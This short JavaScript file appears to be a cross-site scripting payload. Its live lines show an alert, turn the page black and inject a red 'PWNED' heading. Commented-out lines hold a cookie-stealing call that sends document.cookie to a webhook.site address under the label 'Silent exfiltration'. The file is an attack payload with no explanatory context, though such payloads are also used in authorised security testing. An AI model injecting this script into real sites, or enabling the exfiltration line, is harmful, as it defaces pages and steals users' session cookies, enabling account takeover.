// Visual confirmation that script executed
// document.body.innerHTML += "<h1 style='color:red'>🔥 XSS Executed!</h1>";

// Silent exfiltration to your webhook.site
// fetch("https://webhook.site/1058df3b-47af-4f36-81ac-769b03d17414?cookie=" + encodeURIComponent(document.cookie));
alert("🔥 XSS Executed!");
document.body.style.background = "black";
document.body.innerHTML += "<h1 style='color:red;'>PWNED</h1>";